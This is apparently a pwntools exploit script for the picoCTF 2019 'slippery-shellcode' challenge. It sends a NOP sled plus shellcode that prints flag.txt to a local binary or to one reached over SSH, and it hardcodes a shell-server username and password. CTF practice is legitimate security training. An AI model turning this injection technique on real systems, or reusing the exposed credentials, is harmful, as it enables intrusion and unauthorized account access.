#coding=utf-8
from pwn import *

context.binary = './vuln'
debug = 1
if debug:
    p = process('./vuln')
else:
    s = ssh(host = '2019shell1.picoctf.com', user = 'zeze', password = 'h9h9ji3g4go6')
    s.set_working_directory('/problems/slippery-shellcode_4_64839254839978b32eb661ca92071d48')
    p = s.process('./vuln')

payload = shellcraft.nop() * 256

payload += shellcraft.cat('flag.txt', 1)
payload = asm(payload)
log.info(len(payload))
log.info(payload)
p.sendline(payload)
print p.recvall(1)
